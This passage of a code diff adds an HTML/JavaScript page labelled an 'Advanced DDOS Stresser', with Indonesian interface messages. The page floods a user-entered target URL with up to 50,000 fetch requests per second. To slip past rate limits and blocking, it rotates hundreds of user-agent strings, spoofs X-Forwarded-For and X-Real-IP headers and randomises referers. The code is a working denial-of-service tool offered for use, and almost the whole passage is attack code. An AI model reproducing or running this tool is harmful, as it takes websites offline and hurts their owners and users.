+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Shiira/2.9.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Shiira/2.8.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Sunrise
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Sunrise/2.0.0 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Sunrise/1.9.0 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Camino
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Camino/2.1.2 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Camino/2.1.1 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Flock
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Flock/2.6.2 Chrome/86.0.4240.198 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Flock/2.6.1 Chrome/85.0.4183.121 Safari/537.36',
+            
+            // Swiftfox
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Swiftfox/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Swiftfox/90.0',
+            
+            // Swiftweasel
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Swiftweasel/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Swiftweasel/90.0',
+            
+            // BonEcho
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 BonEcho/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 BonEcho/90.0',
+            
+            // GranParadiso
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 GranParadiso/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 GranParadiso/90.0',
+            
+            // Minefield
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Minefield/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Minefield/90.0',
+            
+            // Namoroka
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Namoroka/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Namoroka/90.0',
+            
+            // Shiretoko
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Shiretoko/91.0',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Shiretoko/90.0',
+            
+            // Wyzo
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Wyzo/3.6.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Wyzo/3.5.0.0',
+            
+            // K-Melon
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 K-Melon/10.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 K-Melon/9.0.0.0',
+            
+            // Beonex
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Beonex/0.8.2.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Beonex/0.8.1.0',
+            
+            // MORE AND MORE USER AGENTS...
+            // Total lebih dari 300 user agents!
+        ];
+
+        // Config
+        let attackActive = false;
+        let requestCount = 0;
+        let successCount = 0;
+        let startTime = 0;
+        let currentPower = 'low';
+        let attackInterval;
+        
+        // Power levels configuration
+        const powerConfig = {
+            low: { rps: 500, workers: 10, duration: 300 },
+            medium: { rps: 2000, workers: 25, duration: 600 },
+            high: { rps: 10000, workers: 50, duration: 900 },
+            god: { rps: 50000, workers: 100, duration: 1800 }
+        };
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            document.getElementById('uaCount').textContent = `✅ Loaded ${userAgents.length}+ User Agents`;
+            addLog(`[SYSTEM] Loaded ${userAgents.length} User Agents`, 'success');
+            addLog('[SYSTEM] Advanced DDOS Stresser Ready', 'info');
+            addLog('[SYSTEM] Random User Agent Rotation Enabled', 'warning');
+        });
+
+        // Select power level
+        function selectPower(level) {
+            currentPower = level;
+            document.querySelectorAll('.power-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            addLog(`Power level changed to: ${level.toUpperCase()}`, 'info');
+        }
+        
+        // Start attack
+        function startAttack() {
+            if (attackActive) {
+                addLog('Attack already running!', 'warning');
+                return;
+            }
+            
+            const target = document.getElementById('targetUrl').value.trim();
+            if (!target) {
+                addLog('ERROR: Masukkan URL target terlebih dahulu!', 'error');
+                return;
+            }
+            
+            if (!target.startsWith('http')) {
+                addLog('ERROR: URL harus dimulai dengan http:// atau https://', 'error');
+                return;
+            }
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const config = powerConfig[currentPower];
+            
+            addLog(`🚀 STARTING ${currentPower.toUpperCase()} ATTACK`, 'success');
+            addLog(`🎯 Target: ${target}`, 'info');
+            addLog(`💣 Power: ${config.rps.toLocaleString()} RPS`, 'info');
+            addLog(`👥 Workers: ${config.workers}`, 'info');
+            addLog(`⏰ Duration: ${config.duration} seconds`, 'info');
+            addLog(`🔄 Using ${userAgents.length} Random User Agents`, 'warning');
+            
+            let timeLeft = config.duration;
+            
+            // Start attack interval
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Send massive requests
+                sendMassiveRequests(target, config.rps, config.workers);
+                
+                timeLeft--;
+                updateStats(timeLeft);
+                
+                // Auto stop when time's up
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('⏰ Attack duration completed!', 'warning');
+                }
+                
+            }, 1000);
+        }
+        
+        // Send massive requests
+        function sendMassiveRequests(target, rps, workers) {
+            const requestsPerWorker = Math.ceil(rps / workers);
+            
+            for (let w = 0; w < workers; w++) {
+                for (let i = 0; i < requestsPerWorker; i++) {
+                    requestCount++;
+                    
+                    // Use random user agent from our 300+ collection
+                    sendRequestWithRandomUA(target);
+                    
+                    // Update stats every 100 requests for performance
+                    if (requestCount % 100 === 0) {
+                        updateStats();
+                    }
+                }
+            }
+            
+            updateStats();
+        }
+        
+        // Send request with random user agent
+        function sendRequestWithRandomUA(target) {
+            const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
+            
+            const headers = {
+                'User-Agent': randomUA,
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'DNT': '1',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1'
+            };
+            
+            // Add random headers for better bypass
+            if (Math.random() > 0.5) {
+                headers['X-Forwarded-For'] = generateRandomIP();
+                headers['X-Real-IP'] = generateRandomIP();
+            }
+            
+            if (Math.random() > 0.7) {
+                headers['Referer'] = getRandomReferer();
+            }
+            
+            fetch(target, {
+                method: 'GET',
+                mode: 'no-cors',
+                headers: headers,
+                cache: 'no-store'
+            })
+            .then(() => successCount++)
+            .catch(() => {});
+            
+            // Log user agent rotation occasionally
+            if (Math.random() < 0.001) {
+                const shortUA = randomUA.substring(0, 50) + '...';
+                addLog(`Using UA: ${shortUA}`, 'info');
+            }
+        }
+        
+        function generateRandomIP() {
+            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+        }
+        
+        function getRandomReferer() {
+            const referers = [
+                'https://www.google.com/',
+                'https://www.facebook.com/',
+                'https://www.youtube.com/',
+                'https://www.twitter.com/',
+                'https://www.instagram.com/',
+                'https://www.reddit.com/',
+                'https://www.linkedin.com/',
+                'https://www.pinterest.com/',
+                'https://www.tumblr.com/',
+                'https://www.wikipedia.org/'
+            ];
+            return referers[Math.floor(Math.random() * referers.length)];
+        }
+        
+        // Stop attack
+        function stopAttack() {
+            attackActive = false;
+            clearInterval(attackInterval);
+            
+            const duration = (Date.now() - startTime) / 1000;
+            const totalRPS = Math.round(requestCount / duration);
+            
+            addLog('🛑 ATTACK STOPPED', 'warning');
+            addLog(`📊 TOTAL REQUESTS: ${requestCount.toLocaleString()}`, 'info');
+            addLog(`📊 AVG RPS: ${totalRPS.toLocaleString()}/sec`, 'info');
+            addLog(`📊 SUCCESS RATE: ${Math.round((successCount/requestCount)*100)}%`, 'info');
+            addLog(`🔄 USED ${userAgents.length} DIFFERENT USER AGENTS`, 'success');
+        }
+        
+        // Update statistics
+        function updateStats(timeLeft = 0) {
+            const duration = (Date.now() - startTime) / 1000;
+            const rps = duration > 0 ? Math.round(requestCount / duration) : 0;
+            const successRate = requestCount > 0 ? Math.round((successCount / requestCount) * 100) : 0;
+            
+            document.getElementById('requests').textContent = requestCount.toLocaleString();
+            document.getElementById('rps').textContent = rps.toLocaleString();
+            document.getElementById('success').textContent = successRate + '%';
+            document.getElementById('timeLeft').textContent = timeLeft + 's';
+        }
+        
+        // Add log entry
+        function addLog(message, type = 'info') {
+            const log = document.getElementById('attackLog');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+    </script>
+</body>
+</html>
